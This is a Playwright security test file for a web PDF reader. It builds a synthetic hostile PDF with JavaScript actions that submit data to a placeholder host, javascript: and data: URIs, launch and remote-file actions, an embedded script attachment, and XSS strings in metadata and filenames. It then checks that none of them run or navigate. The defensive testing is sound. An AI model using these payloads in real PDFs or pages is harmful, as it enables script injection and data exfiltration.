import { test, expect } from '@playwright/test'
import { PDFDocument, PDFName, PDFString, StandardFonts } from 'pdf-lib'

/** Synthetic attack fixture only: no customer documents or public exfiltration endpoints. */
async function hostileDocument() {
  const pdf = await PDFDocument.create(), font = await pdf.embedFont(StandardFonts.Helvetica)
  const first = pdf.addPage([400, 600]), second = pdf.addPage([400, 600])
  first.drawText('Security sentinel <img onerror=attack>', { x: 20, y: 550, size: 12, font })
  second.drawText('Internal destination page', { x: 20, y: 550, size: 14, font })
  const script = PDFString.of('globalThis.pdfPayloadRan=true; app.alert("PDF action executed"); this.submitForm("https://pdf-security.invalid/script");')
  pdf.catalog.set(PDFName.of('OpenAction'), pdf.context.obj({ S: 'JavaScript', JS: script }))
  pdf.addJavaScript('payload', script.decodeText())
  first.node.set(PDFName.of('AA'), pdf.context.obj({ O: { S: 'JavaScript', JS: script } }))
  const actions = [
    { S: 'URI', URI: PDFString.of('https://pdf-security.invalid/remote') },
    { S: 'URI', URI: PDFString.of('/pdf-tools/document-link-probe') },
    { S: 'URI', URI: PDFString.of('http://pdf-security.invalid/http') },
    { S: 'URI', URI: PDFString.of('mailto:document@example.invalid') },
    { S: 'URI', URI: PDFString.of('javascript:globalThis.pdfPayloadRan=true') },
    { S: 'URI', URI: PDFString.of('data:text/html,<script>parent.pdfPayloadRan=true</script>') },
    { S: 'Launch', F: PDFString.of('https://pdf-security.invalid/launch') },
    { S: 'SubmitForm', F: PDFString.of('https://pdf-security.invalid/form'), Flags: 4 },
    { S: 'GoToR', F: PDFString.of('https://pdf-security.invalid/other.pdf'), D: [0, 'Fit'] },
    { S: 'Named', N: 'Print' },
    { S: 'GoTo', D: [second.ref, 'Fit'] },
  ]
  const annotations = actions.map((action, i) => pdf.context.register(pdf.context.obj({
    Type: 'Annot', Subtype: 'Link', Rect: [20, 490 - i * 30, 360, 514 - i * 30], Border: [0, 0, 1],
    A: action, AA: { U: { S: 'JavaScript', JS: script } },
  })))
  // Rich annotation text must stay inert; URL inside markup must never become a resource request.
  annotations.push(pdf.context.register(pdf.context.obj({ Type: 'Annot', Subtype: 'Text', Rect: [365, 500, 385, 520],
    Contents: PDFString.of('<img src="https://pdf-security.invalid/comment" onerror="parent.pdfPayloadRan=true">'),
    RC: PDFString.of('<body><p><img src="https://pdf-security.invalid/richtext"/></p></body>'),
  })))
  const embedded = pdf.context.register(pdf.context.stream('<script>parent.pdfPayloadRan=true</script>', { Type: 'EmbeddedFile' }))
  const fileSpec = pdf.context.register(pdf.context.obj({ Type: 'Filespec', F: PDFString.of('payload.html'), EF: { F: embedded } }))
  annotations.push(pdf.context.register(pdf.context.obj({ Type: 'Annot', Subtype: 'FileAttachment',
    Rect: [365, 450, 385, 470], Name: 'Paperclip', FS: fileSpec,
  })))
  const xfa = pdf.context.register(pdf.context.stream('<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template xmlns="http://www.xfa.org/schema/xfa-template/3.3/"><subform><draw><value><image href="https://pdf-security.invalid/xfa"/></value></draw></subform></template></xdp:xdp>'))
  pdf.catalog.set(PDFName.of('AcroForm'), pdf.context.obj({ Fields: [], XFA: xfa }))
  first.node.set(PDFName.of('Annots'), pdf.context.obj(annotations))
  pdf.setTitle('<svg onload=attack>'); pdf.setAuthor('<img src=x onerror=attack>')
  return Buffer.from(await pdf.save())
}

test('untrusted PDF actions, rich text and URLs cannot execute or navigate; internal links still work', async ({ page, context }) => {
  const unexpected: string[] = [], dialogs: string[] = []
  await context.route('**/*', route => {
    const url = new URL(route.request().url())
    const allowed = url.origin === 'http://127.0.0.1:4178' && (url.pathname.startsWith('/pdf-tools/assets/') || url.pathname === '/pdf-tools/reader/')
    if (!allowed && !['blob:', 'data:'].includes(url.protocol)) { unexpected.push(url.href); return route.abort() }
    return route.continue()
  })
  page.on('pageerror', error => { throw error })
  page.on('dialog', dialog => { dialogs.push(dialog.message()); void dialog.dismiss() })
  await page.addInitScript(() => {
    Object.assign(window, { pdfPayloadRan: false, pdfOpenAttempts: [] as string[] })
    window.open = url => { (window as unknown as { pdfOpenAttempts: string[] }).pdfOpenAttempts.push(String(url)); return null }
  })
  await page.goto('reader/')
  const originalUrl = page.url()
  const rawName = '<svg onload=attack>\u202e.pdf'
  await page.locator('input[type=file]').setInputFiles({ name: rawName, mimeType: 'application/pdf', buffer: await hostileDocument() })
  await expect(page.locator('.file-row .file-name')).toHaveText('svg onload=attack.pdf')
  await expect(page.getByRole('button', { name: 'Go', exact: true })).toBeEnabled()
  await expect(page.locator('.textLayer')).toContainText('Security sentinel')
  const disabled = page.locator('.annotationLayer a[aria-disabled="true"]')
  await expect.poll(() => disabled.count()).toBeGreaterThanOrEqual(3)
  for (const link of await disabled.all()) {
    await expect(link).not.toHaveAttribute('href')
    await expect(link).not.toHaveAttribute('target')
    await link.dispatchEvent('click')
    await link.dispatchEvent('auxclick', { button: 1 })
  }
  await page.locator('.fileAttachmentAnnotation img').dblclick()
  await expect(page).toHaveURL(originalUrl)
  expect(await context.pages()).toHaveLength(1)
  // Real destination annotation (last link) still invokes PDF.js internal page navigation.
  const internal = page.locator('.annotationLayer section[data-internal-link] a').last()
  await internal.click()
  await expect(page.getByLabel('Page', { exact: true })).toHaveValue('2')
  await page.getByRole('button', { name: 'Prepare print pages', exact: true }).click()
  await expect(page.getByRole('button', { name: 'Open print dialog', exact: true })).toBeVisible()
  const frame = page.locator('.reader-print-frame')
  await expect(frame).toHaveAttribute('sandbox', 'allow-same-origin allow-modals')
  expect(await frame.evaluate(el => (el as HTMLIFrameElement).contentDocument!.querySelectorAll('script,a,form,img,object,embed').length)).toBe(0)
  expect(await page.evaluate(() => ({ ran: (window as unknown as { pdfPayloadRan: boolean }).pdfPayloadRan, opens: (window as unknown as { pdfOpenAttempts: string[] }).pdfOpenAttempts }))).toEqual({ ran: false, opens: [] })
  expect(dialogs).toEqual([])
  expect(unexpected).toEqual([])
  await expect(page.locator('.file-row svg[onload], .textLayer img, .reader-viewport script')).toHaveCount(0)
})

test('hostile filenames stay text through verified output and browser download', async ({ page }) => {
  await page.goto('pdf-to-text/')
  await page.locator('input[type=file]').setInputFiles({ name: 'CON\u202e.pdf', mimeType: 'application/pdf', buffer: await hostileDocument() })
  await expect(page.locator('.file-row .file-name')).toHaveText('_CON.pdf')
  await page.getByRole('button', { name: 'Export text', exact: true }).click()
  const downloadButton = page.getByRole('button', { name: /Download/ }).first()
  await expect(downloadButton).toBeVisible()
  const downloading = page.waitForEvent('download')
  await downloadButton.click()
  const download = await downloading
  expect(download.suggestedFilename()).toBe('_CON.txt')
})
